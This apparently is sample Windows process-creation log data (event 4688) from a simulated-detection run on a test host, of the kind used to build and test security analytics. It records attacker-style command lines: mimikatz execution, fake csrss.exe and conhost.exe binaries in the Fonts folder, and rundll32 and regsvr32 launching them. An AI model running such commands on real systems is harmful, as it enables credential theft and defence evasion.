107,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:14.033,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1724,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,"cmd  /c ""echo blahtest > \\.\pipe\blahtest""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:14.033,sibling,1,,
108,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:14.157,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1758,C:\Diagnostics\UserTmp\reg.exe,%%1936,0xbc8,".\reg.exe   add ""hkcu\console"" /v windowposition /t reg_dword /d 33554556 /f",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:14.157,sibling,1,,
109,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:14.293,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x178c,C:\Windows\Fonts\csrss.exe,%%1936,0xbc8,c:\windows\fonts\csrss.exe,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:14.293,sibling,1,,
110,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:14.493,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x17e4,C:\Windows\Fonts\conhost.exe,%%1936,0xbc8,c:\windows\fonts\conhost.exe,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:14.493,sibling,1,,
111,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:14.563,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1440,C:\Diagnostics\UserTmp\mimikatz.exe,%%1936,0xbc8,.\mimikatz.exe,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:14.563,sibling,1,,
112,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:14.613,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1434,C:\Diagnostics\UserTmp\rundll32.exe,%%1936,0xbc8,.\rundll32.exe  /C c:\windows\fonts\conhost.exe,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:14.613,sibling,1,,
113,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:14.693,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x123c,C:\Diagnostics\UserTmp\regsvr32.exe,%%1936,0xbc8,.\regsvr32  /u /s c:\windows\fonts\csrss.exe,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:14.693,sibling,1,,
114,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:14.770,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x240,C:\Windows\System32\tasklist.exe,%%1936,0xbc8,tasklist,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:14.770,sibling,1,,
115,802d39e1-9d70-404d-832c-2de5e2478eda,WORKGROUP\MSTICAlertsWin1$,4688,2019-01-15 05:15:03.047,MSTICAlertsWin1,S-1-5-18,MSTICAlertsWin1$,WORKGROUP,0x3e7,0xbc8,C:\Windows\System32\cmd.exe,%%1936,0x440,cmd.exe /c c:\Diagnostics\WindowsSimulateDetections.bat c:\Diagnostics\UserTmp,C:\Windows\System32\svchost.exe,0xfaac27,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:03.047,parent,1,,
116,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:13.053,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x15a0,C:\Windows\System32\win32calc.exe,%%1936,0x1580,"""C:\Windows\System32\win32calc.exe"" ",C:\Diagnostics\UserTmp\powershell.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:13.053,child,1,,
